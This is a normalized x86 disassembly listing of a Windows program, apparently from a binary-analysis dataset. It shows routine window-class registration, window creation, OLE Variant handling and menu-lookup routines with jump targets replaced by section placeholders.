movsd [ edi ] [ esi ]
push eax
push ebx
movsd [ edi ] [ esi ]
call [ ecx + 0x54 ]
jmp r-xdata
push 0x3
push 0x0
push eax
lea eax [ ebp - 0x10 ]
push eax
call [ VariantChangeType@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov esi eax
test esi esi
jl r-xdata
cmp ax 0x400c
jne r-xdata
test al 0xc
jne r-xdata
cmp [ edi + 0x8 ] edx
jne r-xdata
mov ecx [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x2c ]
jmp r-xdata
cmp [ edi + 0x8 ] edx
jne r-xdata
mov ecx [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x28 ]
mov esi eax
test esi esi
jl r-xdata
push [ ebp + 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebx ]
push eax
push [ ebp + 0x18 ]
push ebx
call [ ecx + 0x60 ]
jmp r-xdata
push 0x3
push 0x0
push eax
lea eax [ ebp - 0x10 ]
push eax
call edi
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp + 0x28 ]
and [ eax ] 0x0
jmp r-xdata
lea eax [ ebp - 0x10 ]
lea eax [ ebp - 0x10 ]
test cl 0xc
je r-xdata
lea eax [ ebp - 0x10 ]
mov eax [ ebp + 0x20 ]
mov [ eax ] 0x8
jmp r-xdata
cmp ax 0x4008
jne r-xdata
push [ esi + 0x8 ]
call [ VariantClear@IAT ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x8
mov eax [ esi + 0x8 ]
add eax 0x8
jmp r-xdata
mov esi 0x80020005
mov esi [ ebp - 0x44 ]
mov eax [ ebp - 0x40 ]
cmp [ eax ] 0x8
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
je r-xdata
mov esi [ ebp - 0x44 ]
mov eax [ ebp - 0x40 ]
cmp [ eax ] 0x8
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
je r-xdata
mov eax [ ebp + 0x28 ]
mov [ eax ] 0x1
jmp r-xdata
lea eax [ ebp - 0x10 ]
mov eax [ esi + 0x8 ]
jmp r-xdata
push [ esi + 0x8 ]
call [ VariantClear@IAT ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x3
mov eax [ esi + 0x8 ]
add eax 0x8
jmp r-xdata
push esi
call [ VariantClear@IAT ]
lea eax [ esi + 0x8 ]
mov [ esi ] 0x8
mov eax [ esi + 0x8 ]
jmp r-xdata
mov edx [ ebp + 0x20 ]
mov esi [ ebp - 0x40 ]
mov ecx [ ebx ]
add edx 0x8
push edx
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
push ebx
movsd [ edi ] [ esi ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ ebx ]
push eax
sub esp 0x10
mov edi esp
lea esi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ ecx + 0x6c ]
jmp r-xdata
push 0x3
push 0x0
push eax
lea eax [ ebp - 0x10 ]
push eax
call [ VariantChangeType@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ ebx ]
push eax
sub esp 0x10
mov edi esp
lea esi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ ecx + 0x68 ]
push 0x3
push 0x0
push eax
lea eax [ ebp - 0x10 ]
push eax
call [ VariantChangeType@IAT ]
mov esi eax
test esi esi
jge r-xdata
movzx ecx [ esi ]
test cx 0x4000
je r-xdata
mov esi eax
test esi esi
jl r-xdata
lea eax [ ebp - 0x10 ]
lea eax [ ebp - 0x10 ]
sub_40a295
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
push esi
push edi
jbe r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
lea edi [ eax + ebx * 4 ]
xor esi esi
add esi 0x4
cmp esi 0x4c
jb r-xdata
mov eax [ esi + rw-data ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x1 ] 0x1
mov [ ecx + ebx * 4 ] eax
push [ esi + rw-data ]
push [ edi ]
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax 0x80020006
jmp r-xdata
inc ebx
cmp ebx [ ebp + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x14
sub_40a2f5
push esi
mov esi ecx
call sub_40e9db
mov eax [ esp + 0x8 ]
mov [ esi ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x34 ] r--data
mov [ esi + 0x20 ] eax
xor eax eax
mov [ esi + 0x24 ] al
mov [ esi + 0x2c ] eax
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] eax
mov eax esi
pop esi
retn 0x4
sub_40a34d
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x40 ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x20 ]
push eax
call [ CallWindowProcA@IAT ]
mov eax [ esi ]
call [ eax + 0xf0 ]
mov eax [ eax ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x20 ]
call [ DefWindowProcA@IAT ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_40a3b4
push ebp
mov ebp esp
push ebx
push edi
push [ ebp + 0xc ]
mov ebx ecx
push [ ebp + 0x8 ]
push [ ebx + 0x20 ]
call sub_40e6a0
mov edi eax
test edi edi
je r-xdata
or eax 0xffffffff
push esi
push edi
call [ GetDlgCtrlID@IAT ]
mov esi [ ebp + 0x10 ]
test esi esi
movzx eax ax
mov [ ebp + 0xc ] eax
je r-xdata
mov eax [ ebp + 0xc ]
pop esi
jmp r-xdata
cmp [ esi ] 0x28
jb r-xdata
pop edi
pop ebx
pop ebp
retn 0xc
mov eax [ ebx + 0x20 ]
or [ esi + 0x4 ] 0x1
or [ esi + 0x24 ] 0xffffffff
push 0x0
push 0x0
push 0x87
push edi
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edi
call [ SendMessageA@IAT ]
test ax 0x2000
jne r-xdata
or [ esi + 0x4 ] 0x80000002
sub_40a426
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
xor eax eax
mov [ ebp + 0x8 ] eax
cmp eax [ ebx ]
je r-xdata
cmp edx [ ebx + 0x4 ]
jne r-xdata
add ebx 0x18
jmp r-xdata
cmp ecx [ ebx + 0x8 ]
jb r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
cmp ecx [ ebx + 0xc ]
ja r-xdata
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
pop ebp
retn 0x10
sub_40a466
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x10c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop esi
leave
retn 0xc
push [ ebp + 0x10 ]
mov eax [ esi ]
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call [ eax + 0x110 ]
mov [ ebp - 0x4 ] eax
sub_40a4d4
push esi
mov esi ecx
call sub_40ef36
cmp [ esp + 0xc ] 0x0
jne r-xdata
push eax
push 0x0
mov ecx esi
call sub_40ef1c
push eax
push [ esp + 0x14 ]
call [ AdjustWindowRectEx@IAT ]
pop esi
retn 0x8
and eax 0xfffffdff
sub_40a59d
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ esp + 0x1c ]
lea esi [ esp + 0x10 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x24 ]
pop edi
pop esi
retn 0x14
sub_40a5be
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ esp + 0x1c ]
lea esi [ esp + 0x10 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x28 ]
pop edi
pop esi
retn 0x14
sub_40a5df
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ esp + 0x1c ]
lea esi [ esp + 0x10 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x2c ]
pop edi
pop esi
retn 0x14
sub_40a600
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ esp + 0x1c ]
lea esi [ esp + 0x10 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x30 ]
pop edi
pop esi
retn 0x14
sub_40a621
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ esp + 0x1c ]
lea esi [ esp + 0x10 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x34 ]
pop edi
pop esi
retn 0x14
sub_40a642
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ esp + 0x1c ]
lea esi [ esp + 0x10 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x38 ]
pop edi
pop esi
retn 0x14
sub_40a663
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ esp + 0x1c ]
lea esi [ esp + 0x10 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x3c ]
pop edi
pop esi
retn 0x14
sub_40a684
mov eax [ ecx + 0x28 ]
push esi
push edi
push [ esp + 0x20 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
push [ esp + 0x20 ]
lea esi [ esp + 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x40 ]
pop edi
pop esi
retn 0x18
sub_40a6a9
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ esp + 0x1c ]
lea esi [ esp + 0x10 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x44 ]
pop edi
pop esi
retn 0x14
sub_40a6ea
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ esp + 0x1c ]
lea esi [ esp + 0x10 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x50 ]
pop edi
pop esi
retn 0x14
sub_40a70b
mov eax [ ecx + 0x28 ]
mov ecx [ eax ]
push esi
push edi
sub esp 0x10
mov edi esp
push [ esp + 0x1c ]
lea esi [ esp + 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x54 ]
pop edi
pop esi
retn 0x14
sub_40a72c
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
sub esp 0x10
mov edi esp
push [ ebp + 0x14 ]
lea esi [ ebp + 0x18 ]
push [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
push [ ebp + 0xc ]
movsd [ edi ] [ esi ]
push [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x58 ]
pop edi
pop esi
pop ebp
retn 0x20
sub_40a758
mov eax [ ecx + 0x28 ]
push esi
push edi
push [ esp + 0x20 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
push [ esp + 0x20 ]
lea esi [ esp + 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x5c ]
pop edi
pop esi
retn 0x18
sub_40a795
mov eax [ ecx + 0x28 ]
mov ecx [ eax ]
push esi
push edi
sub esp 0x10
mov edi esp
lea esi [ esp + 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x64 ]
pop edi
pop esi
retn 0x10
sub_40a7b2
mov eax [ ecx + 0x28 ]
push esi
mov ecx [ eax ]
push edi
push [ esp + 0x1c ]
lea esi [ esp + 0x10 ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x68 ]
pop edi
pop esi
retn 0x14
sub_40a81b
push 0x14
push r--data
call sub_4106dc
xor esi esi
mov [ ebp - 0x20 ] esi
lea eax [ ebp - 0x20 ]
push eax
call sub_407eab
push [ eax + 0x80 ]
call sub_4077d7
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] esi
cmp eax esi
jne r-xdata
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call [ RegisterClassA@IAT ]
movzx eax ax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a877
mov ax [ ebp - 0x1c ]
xor ax ax
jmp r-xdata
call sub_410721
retn
sub_40a877
cmp [ ebp - 0x24 ] 0x2
je r-xdata
retn
xor eax eax
cmp [ ebp - 0x1c ] ax
sete al
mov esi eax
test esi esi
je r-xdata
xor edi edi
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push edi
call [ SetLastError@IAT ]
push [ ebp - 0x20 ]
push 0x0
call sub_4077c7
test esi esi
je r-xdata
sub_40a8ae
push 0x14
push r--data
call sub_4106dc
xor ebx ebx
mov [ ebp - 0x20 ] ebx
lea eax [ ebp - 0x20 ]
push eax
call sub_407eab
push [ eax + 0x80 ]
call sub_4077d7
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] ebx
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetClassInfoA@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a90d
mov eax [ ebp - 0x1c ]
xor eax eax
jmp r-xdata
call sub_410721
retn
sub_40a90d
cmp [ ebp - 0x24 ] 0x2
je r-xdata
retn
xor eax eax
cmp [ ebp - 0x1c ] ebx
sete al
mov esi eax
cmp esi ebx
je r-xdata
xor edi edi
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push edi
call [ SetLastError@IAT ]
push [ ebp - 0x20 ]
push ebx
call sub_4077c7
cmp esi ebx
je r-xdata
sub_40a942
push 0x14
push r--data
call sub_4106dc
xor ebx ebx
mov [ ebp - 0x20 ] ebx
lea eax [ ebp - 0x20 ]
push eax
call sub_407eab
push [ eax + 0x80 ]
call sub_4077d7
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] ebx
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetClassInfoExA@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a9a1
mov eax [ ebp - 0x1c ]
xor eax eax
jmp r-xdata
call sub_410721
retn
sub_40a9a1
cmp [ ebp - 0x24 ] 0x2
je r-xdata
retn
xor eax eax
cmp [ ebp - 0x1c ] ebx
sete al
mov esi eax
cmp esi ebx
je r-xdata
xor edi edi
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push edi
call [ SetLastError@IAT ]
push [ ebp - 0x20 ]
push ebx
call sub_4077c7
cmp esi ebx
je r-xdata
sub_40a9d6
push 0x14
push r--data
call sub_4106dc
xor ebx ebx
mov [ ebp - 0x20 ] ebx
lea eax [ ebp - 0x20 ]
push eax
call sub_407eab
push [ eax + 0x80 ]
call sub_4077d7
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] ebx
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x34 ]
push [ ebp + 0x30 ]
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateWindowExA@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40aa50
mov eax [ ebp - 0x1c ]
xor eax eax
jmp r-xdata
call sub_410721
retn
sub_40aa50
cmp [ ebp - 0x24 ] 0x2
je r-xdata
retn
xor eax eax
cmp [ ebp - 0x1c ] ebx
sete al
mov esi eax
cmp esi ebx
je r-xdata
xor edi edi
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push edi
call [ SetLastError@IAT ]
push [ ebp - 0x20 ]
push ebx
call sub_4077c7
cmp esi ebx
je r-xdata
sub_40aacf
push esi
mov esi [ esp + 0x8 ]
mov eax 0x7fffffff
cmp esi eax
je r-xdata
mov ecx [ ecx ]
cmp ecx eax
je r-xdata
mov edx [ ecx ]
cmp edx eax
je r-xdata
call sub_4054e9
push ecx
call sub_4086ff
pop esi
retn 0x4
mov [ ecx ] esi
cmp edx esi
je r-xdata
sub_40ab18
push esi
mov esi ecx
call sub_40e9db
xor eax eax
mov [ esi ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x34 ] r--data
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] al
mov [ esi + 0x2c ] eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] eax
mov eax esi
pop esi
retn
sub_40ab7e
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
test eax eax
push ebx
push esi
push edi
jne r-xdata
mov edi [ eax + 0x20 ]
xor edi edi
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ ebp + 0x18 ]
push [ ebp + 0x20 ]
mov edx [ eax + 0x4 ]
mov esi [ eax ]
push edi
mov edi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
mov ebx [ ecx ]
sub edi edx
push edi
sub eax esi
push eax
push edx
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ ebx + 0x5c ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x20
sub_40abc7
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
test eax eax
push ebx
push esi
push edi
jne r-xdata
mov edi [ eax + 0x20 ]
xor edi edi
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ ebp + 0x14 ]
push [ ebp + 0x1c ]
mov edx [ eax + 0x4 ]
mov esi [ eax ]
mov ebx [ ecx ]
push edi
mov edi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub edi edx
push edi
sub eax esi
push eax
mov eax [ ebp + 0x10 ]
push edx
push esi
or eax 0x40000000
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
call [ ebx + 0x5c ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x1c
sub_40ac15
push esi
call sub_407ede
mov esi eax
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
cmp [ esp + 0x8 ] 0x0
mov esi [ esi + 0x50 ]
je r-xdata
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
pop esi
retn 0x4
test esi esi
je r-xdata
push 0x0
push 0x0
push 0x401
push eax
call [ SendMessageA@IAT ]
push 0x1
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0x164 ]
sub_40ac66
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
push edi
jne r-xdata
push [ esi + 0x4 ]
call [ GetMenuItemCount@IAT ]
xor edi edi
test eax eax
mov [ ebp + 0x8 ] eax
jle r-xdata
call sub_4054e9
xor eax eax
mov ebx [ ebp + 0xc ]
push edi
push [ esi + 0x4 ]
call [ GetMenuItemID@IAT ]
cmp eax ebx
je r-xdata
cmp [ eax + 0x4 ] ebx
je r-xdata
push [ esi + 0x4 ]
call sub_40f304
jmp r-xdata
inc edi
cmp edi [ ebp + 0x8 ]
jl r-xdata
push ebx
push eax
call sub_40ac66
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
mov ecx esi
call sub_40aa85
test eax eax
je r-xdata
jmp r-xdata
sub_40ad02
push esi
mov esi ecx
call sub_407eab
mov eax [ eax + 0x4 ]
cmp [ eax + 0x6c ] 0x1
jne r-xdata
push [ esp + 0xc ]
mov eax [ esi ]
push [ esp + 0xc ]
mov ecx esi
call [ eax + 0x74 ]
mov eax [ esp + 0xc ]
cmp eax 0x1
jne r-xdata
cmp eax 0x3
jne r-xdata
push 0xf
pop eax
jmp r-xdata
cmp eax 0xb
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov edx [ esi ]
push eax
push [ esp + 0xc ]
mov ecx esi
call [ edx + 0x78 ]
jmp r-xdata
xor eax eax
pop esi
retn 0x8
sub_40ad7c
push 0x8
mov eax sub_420f19
call sub_41021d
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
add esi 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_408504
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x4
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40adc4
push 0x8
mov eax sub_420f19
call sub_41021d
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
add esi 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_408575
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x4
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40ae0c
push 0x8
mov eax sub_420f19
call sub_41021d
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
add esi 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
mov ecx esi
call sub_4085ca
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0xc
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40ae5a
push 0x8
mov eax sub_420f19
call sub_41021d
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x28 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_409cc9
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x24
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40aeb6
push 0x8
mov eax sub_420f19
call sub_41021d
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
add esi 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0xc ]
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call [ eax + 0x8c ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x8
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40af04
push 0x8
mov eax sub_420f19
call sub_41021d
mov esi [ ebp + 0x8 ]
push [ esi - 0x14 ]
add esi 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0xc ]
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call [ eax + 0x90 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x8
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40af52
push 0x8
mov eax sub_420f19
call sub_41021d
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0x94 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40afac
push 0x8
mov eax sub_420f19
call sub_41021d
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0x98 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b006
push 0x8
mov eax sub_420f19
call sub_41021d
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0x9c ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_4102bc
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_4077c7
sub_40b060
push 0x8
mov eax sub_420f19
call sub_41021d
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_407ef7
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
